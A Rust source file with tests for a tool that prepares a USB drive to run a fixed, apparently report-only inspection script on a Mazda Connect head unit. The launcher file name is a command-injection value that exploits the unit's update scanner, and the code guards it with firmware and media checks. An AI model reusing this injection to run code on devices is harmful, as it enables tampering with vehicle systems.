//! Prepare a firmware-gated, report-only USB payload for a Mazda Connect CMU.
//!
//! The Mac-side preparer writes only to an existing, otherwise empty destination directory. The
//! CMU-side payload is a fixed POSIX shell script embedded in this crate; it has no arbitrary path,
//! command, persistence, remount, reboot, VIP, CAN, or LIN options.

use std::ffi::OsStr;
use std::fmt;
use std::fs::{self, OpenOptions};
use std::io::{self, Write};
use std::path::{Path, PathBuf};

#[cfg(target_os = "macos")]
use std::path::Component;
#[cfg(target_os = "macos")]
use std::process::Command;

/// The only firmware family on which the USB launcher is currently allowed to run.
pub const SUPPORTED_FIRMWARE: &str = "74.00.324A";

/// The command-injection filename consumed by the vulnerable Gen-6.5 update scanner.
///
/// FAT filenames cannot contain `/`, so the command obtains the root path from the scanner's
/// established `HOME=/root` environment and checks each stock removable-media mount. The command
/// can only invoke the fixed `cmu-inspect.sh` filename.
pub const LAUNCHER_FILE_NAME: &str =
    "$(R=${HOME%root};for V in a b c d;do P=${R}tmp${R}mnt${R}sd${V}1${R}cmu-inspect.sh;[ -f $P ]&&sh $P&&break;done).up";

const COLLECTOR_FILE_NAME: &str = "cmu-inspect.sh";
const UPDATE_FLAG_FILE_NAME: &str = "jci-autoupdate";
const COLLECTOR: &[u8] = include_bytes!("../assets/cmu-inspect.sh");

/// An error encountered before or while preparing removable media.
#[derive(Debug)]
pub enum PrepareError {
    UnsupportedFirmware,
    DestinationNotFound,
    DestinationIsSymlink,
    DestinationNotDirectory,
    DestinationTooBroad,
    DestinationOutsideMacVolumes,
    DestinationNotFat32,
    DestinationNotRemovable,
    DestinationNotEmpty(String),
    Io {
        action: &'static str,
        path: PathBuf,
        source: io::Error,
    },
}

impl fmt::Display for PrepareError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedFirmware => write!(
                formatter,
                "firmware must be explicitly confirmed as {SUPPORTED_FIRMWARE}"
            ),
            Self::DestinationNotFound => write!(formatter, "destination does not exist"),
            Self::DestinationIsSymlink => {
                write!(formatter, "destination must not be a symbolic link")
            }
            Self::DestinationNotDirectory => write!(formatter, "destination is not a directory"),
            Self::DestinationTooBroad => {
                write!(formatter, "refusing a filesystem root destination")
            }
            Self::DestinationOutsideMacVolumes => write!(
                formatter,
                "on macOS, destination must be a mounted volume root under /Volumes"
            ),
            Self::DestinationNotFat32 => {
                write!(formatter, "destination volume is not FAT32 (msdos)")
            }
            Self::DestinationNotRemovable => {
                write!(formatter, "destination volume is not removable media")
            }
            Self::DestinationNotEmpty(name) => write!(
                formatter,
                "destination contains non-macOS-metadata entry {name:?}; use a blank FAT32 drive"
            ),
            Self::Io {
                action,
                path,
                source,
            } => write!(formatter, "could not {action} {}: {source}", path.display()),
        }
    }
}

impl std::error::Error for PrepareError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            _ => None,
        }
    }
}

/// Writes the three-file report payload into an existing blank removable-media directory.
///
/// `confirmed_firmware` must exactly match [`SUPPORTED_FIRMWARE`]. Existing files are never
/// overwritten, and a partial preparation is rolled back if a later file cannot be created.
///
/// # Errors
///
/// Returns an error when the firmware was not explicitly confirmed, the destination is unsafe or
/// non-empty, or any payload file cannot be created and flushed.
pub fn prepare_usb(destination: &Path, confirmed_firmware: &str) -> Result<(), PrepareError> {
    if confirmed_firmware != SUPPORTED_FIRMWARE {
        return Err(PrepareError::UnsupportedFirmware);
    }

    let metadata = fs::symlink_metadata(destination).map_err(|error| {
        if error.kind() == io::ErrorKind::NotFound {
            PrepareError::DestinationNotFound
        } else {
            io_error("inspect", destination, error)
        }
    })?;
    if metadata.file_type().is_symlink() {
        return Err(PrepareError::DestinationIsSymlink);
    }
    if !metadata.is_dir() {
        return Err(PrepareError::DestinationNotDirectory);
    }
    if destination.parent().is_none() {
        return Err(PrepareError::DestinationTooBroad);
    }

    #[cfg(target_os = "macos")]
    verify_macos_volume(destination)?;

    let entries =
        fs::read_dir(destination).map_err(|error| io_error("list", destination, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| io_error("list", destination, error))?;
        if !is_ignorable_macos_metadata(&entry.file_name()) {
            return Err(PrepareError::DestinationNotEmpty(
                entry.file_name().to_string_lossy().into_owned(),
            ));
        }
    }

    let payloads: [(&str, &[u8]); 3] = [
        (COLLECTOR_FILE_NAME, COLLECTOR),
        (UPDATE_FLAG_FILE_NAME, b"\n"),
        (LAUNCHER_FILE_NAME, b"\n"),
    ];
    let mut created = Vec::with_capacity(payloads.len());

    for (name, content) in payloads {
        let path = destination.join(name);
        if let Err(error) = create_new_file(&path, content) {
            let _ = fs::remove_file(&path);
            rollback_created_files(&created);
            return Err(io_error("create payload file", &path, error));
        }
        created.push(path);
    }

    Ok(())
}

fn create_new_file(path: &Path, content: &[u8]) -> io::Result<()> {
    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
    file.write_all(content)?;
    file.sync_all()
}

fn rollback_created_files(created: &[PathBuf]) {
    for path in created.iter().rev() {
        let _ = fs::remove_file(path);
    }
}

fn is_ignorable_macos_metadata(name: &OsStr) -> bool {
    matches!(
        name.to_str(),
        Some(".fseventsd" | ".Spotlight-V100" | ".Trashes")
    )
}

fn io_error(action: &'static str, path: &Path, source: io::Error) -> PrepareError {
    PrepareError::Io {
        action,
        path: path.to_owned(),
        source,
    }
}

#[cfg(target_os = "macos")]
fn verify_macos_volume(destination: &Path) -> Result<(), PrepareError> {
    let mut components = destination.components();
    let is_volume_root = matches!(components.next(), Some(Component::RootDir))
        && matches!(components.next(), Some(Component::Normal(name)) if name == "Volumes")
        && matches!(components.next(), Some(Component::Normal(_)))
        && components.next().is_none();
    if !is_volume_root {
        return Err(PrepareError::DestinationOutsideMacVolumes);
    }

    let output = Command::new("/usr/sbin/diskutil")
        .args(["info", "-plist"])
        .arg(destination)
        .output()
        .map_err(|error| io_error("inspect volume with diskutil", destination, error))?;
    if !output.status.success() {
        return Err(io_error(
            "inspect volume with diskutil",
            destination,
            io::Error::other("diskutil returned a failure status"),
        ));
    }

    let plist = String::from_utf8_lossy(&output.stdout);
    if !plist_value_starts_with(&plist, "FilesystemType", "<string>msdos</string>") {
        return Err(PrepareError::DestinationNotFat32);
    }
    if !plist_value_starts_with(&plist, "RemovableMedia", "<true/>") {
        return Err(PrepareError::DestinationNotRemovable);
    }

    Ok(())
}

#[cfg(target_os = "macos")]
fn plist_value_starts_with(plist: &str, key: &str, expected_value: &str) -> bool {
    let marker = format!("<key>{key}</key>");
    plist
        .split_once(&marker)
        .is_some_and(|(_, remainder)| remainder.trim_start().starts_with(expected_value))
}

#[cfg(test)]
mod tests {
    use std::process::Command;
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    struct TestDirectory(PathBuf);

    impl TestDirectory {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("clock is after Unix epoch")
                .as_nanos();
            let path = std::env::temp_dir().join(format!(
                "mazda-cmu-inspect-{label}-{}-{unique}",
                std::process::id()
            ));
            fs::create_dir_all(&path).expect("create test directory");
            Self(path)
        }

        fn write(&self, relative: &str, content: &[u8]) {
            let path = self.0.join(relative);
            fs::create_dir_all(path.parent().expect("fixture has a parent"))
                .expect("create fixture parent");
            fs::write(path, content).expect("write fixture");
        }
    }

    impl Drop for TestDirectory {
        fn drop(&mut self) {
            fs::remove_dir_all(&self.0).expect("remove test directory");
        }
    }

    #[test]
    fn prepares_exact_payload_without_overwriting() {
        let usb = TestDirectory::new("prepare");

        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");

        assert_eq!(
            fs::read(usb.0.join(COLLECTOR_FILE_NAME)).expect("read collector"),
            COLLECTOR
        );
        assert_eq!(
            fs::read(usb.0.join(UPDATE_FLAG_FILE_NAME)).expect("read flag"),
            b"\n"
        );
        assert!(usb.0.join(LAUNCHER_FILE_NAME).is_file());
        assert!(matches!(
            prepare_usb(&usb.0, SUPPORTED_FIRMWARE),
            Err(PrepareError::DestinationNotEmpty(_))
        ));
    }

    #[test]
    fn launcher_name_is_a_single_valid_fat_component() {
        assert!(LAUNCHER_FILE_NAME.len() <= 255);
        assert!(!LAUNCHER_FILE_NAME.chars().any(|character| matches!(
            character,
            '<' | '>' | ':' | '"' | '/' | '\\' | '|' | '?' | '*'
        )));
        assert!(Path::new(LAUNCHER_FILE_NAME)
            .extension()
            .is_some_and(|extension| extension.eq_ignore_ascii_case("up")));
        assert!(LAUNCHER_FILE_NAME.contains("cmu-inspect.sh"));
    }

    #[test]
    fn refuses_unconfirmed_firmware_before_writing() {
        let usb = TestDirectory::new("firmware");

        let result = prepare_usb(&usb.0, "70.00.100A");

        assert!(matches!(result, Err(PrepareError::UnsupportedFirmware)));
        assert_eq!(fs::read_dir(&usb.0).expect("list USB").count(), 0);
    }

    #[test]
    fn collector_is_firmware_gated_bounded_and_usb_only() {
        let usb = TestDirectory::new("collector-usb");
        let root = TestDirectory::new("collector-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
        root.write(
            "jci/version.ini",
            b"JCI_SW_VER=\"cmu150_NA_74.00.324\"\nJCI_SW_VER_PATCH=\"A\"\n",
        );
        root.write("proc/version", b"Linux fixture\n");
        root.write("proc/cpuinfo", &vec![b'x'; 256 * 1024 + 4096]);
        root.write("persistent/sentinel", b"unchanged");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(output.status.success());
        assert!(output.stdout.is_empty());
        assert!(output.stderr.is_empty());
        let report = usb.0.join("mazda-cmu-report");
        assert_eq!(
            fs::read(report.join("kernel-version.txt")).expect("read captured kernel"),
            b"Linux fixture\n"
        );
        assert_eq!(
            fs::metadata(report.join("cpuinfo.txt"))
                .expect("stat captured CPU info")
                .len(),
            256 * 1024
        );
        let manifest = fs::read_to_string(report.join("manifest.tsv")).expect("read manifest");
        assert!(manifest.contains("proc/cpuinfo\ttruncated\t262144"));
        assert_eq!(
            fs::read(root.0.join("persistent/sentinel")).expect("read sentinel"),
            b"unchanged"
        );
    }

    #[test]
    fn collector_refuses_other_firmware_without_creating_report() {
        let usb = TestDirectory::new("refusal-usb");
        let root = TestDirectory::new("refusal-root");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE).expect("prepare payload");
        root.write("jci/version.ini", b"JCI_SW_VER=\"cmu150_NA_74.00.331\"\n");

        let output = Command::new("sh")
            .arg(usb.0.join(COLLECTOR_FILE_NAME))
            .env("MAZDA_CMU_INSPECT_TESTING", "1")
            .env("MAZDA_CMU_INSPECT_TEST_ROOT", &root.0)
            .env("MAZDA_CMU_INSPECT_TEST_USB", &usb.0)
            .output()
            .expect("run collector");

        assert!(!output.status.success());
        assert!(!usb.0.join("mazda-cmu-report").exists());
    }
}
